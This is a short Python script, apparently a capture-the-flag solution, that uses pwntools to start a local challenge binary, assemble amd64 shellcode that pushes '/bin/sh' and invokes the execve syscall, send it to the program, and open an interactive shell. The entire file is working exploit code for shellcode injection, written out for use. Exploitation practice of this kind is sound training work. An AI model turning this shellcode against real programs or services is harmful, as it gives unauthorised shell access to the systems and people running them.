from pwn import *

context.arch = 'amd64'

io = process('../challenge/simple')
#gdb.attach(io)

shellcode = '''
mov rax, %d
push rax

mov rdi, rsp
mov rsi, 0
mov rdx, 0
mov rax, 0x3b
syscall
''' % u64('/bin/sh\0')

io.sendline(asm(shellcode))

io.interactive()
